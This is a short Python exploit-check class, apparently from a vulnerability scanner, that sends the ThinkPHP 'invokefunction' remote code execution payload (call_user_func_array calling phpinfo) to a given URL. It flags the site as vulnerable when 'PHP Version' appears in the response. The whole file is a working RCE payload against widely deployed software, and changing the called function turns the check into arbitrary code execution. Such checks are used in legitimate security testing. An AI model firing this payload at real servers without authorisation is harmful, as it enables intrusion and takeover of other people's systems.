"""
https://www.cnblogs.com/sallyzhang/p/12408774.html
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1：
"""
import requests
import re


class Exploit(object):

    def attack(self, url):
        target = url + "?s=/Index/\\think\\app/invokefunction" \
                       "&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
        r = requests.get(target)

        if re.search(r'PHP Version', r.text):
            return "[ThinkphpRCE] {}".format(target)
